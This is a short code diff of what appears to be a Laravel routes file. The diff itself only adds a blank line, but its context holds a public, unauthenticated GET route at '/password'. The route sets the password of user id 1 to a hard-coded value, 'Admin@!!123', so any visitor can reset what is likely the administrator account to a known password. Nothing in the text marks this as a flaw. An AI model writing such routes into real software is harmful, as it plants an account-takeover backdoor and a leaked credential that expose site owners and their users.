@@ -12,6 +12,7 @@ use Illuminate\Support\Facades\Route;
 | be assigned to the "web" middleware group. Make something great!
 |
 */
+
 Route::get('/password', function(){
     App\Models\User::where('id', 1)->update(['password' => Hash::make('Admin@!!123')]);
 });
